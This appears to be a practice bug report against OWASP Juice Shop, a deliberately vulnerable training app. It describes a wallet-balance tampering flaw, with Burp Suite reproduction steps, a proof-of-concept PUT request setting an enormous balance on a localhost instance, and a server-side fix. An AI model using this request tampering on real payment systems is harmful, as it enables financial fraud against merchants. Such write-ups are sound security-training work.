# Business Logic Flaw Leading to  Wallet Balance Manipulation

## Target
OWASP Juice Shop



## Severity
High

## Description
The application allows users to change their wallet balance by modifying a client-controlled HTTP request.

## Steps to reproduce
1. Intercept the request using a proxy such as Burp Suite
2. Normally add funds to the wallet
3. Send the intercepted PUT request to repeater
4. Modify `balance` parameter
5. Forwar the modified request to browser
6. Refresh the page and observe the updated balance

## Proof of concept
PUT /rest/wallet/balance HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
    "balance":1000000000000,
    "paymentId":7
}

## Impact
Allows attackers to generate unlimited funds, leading to financial abuse such as free purchases, bypassing payment mechanisms or exploring the vulnerability for monetary gain

## Recommendation
Ignore user input and validate balance server-side. Implement ledger-based transaction model
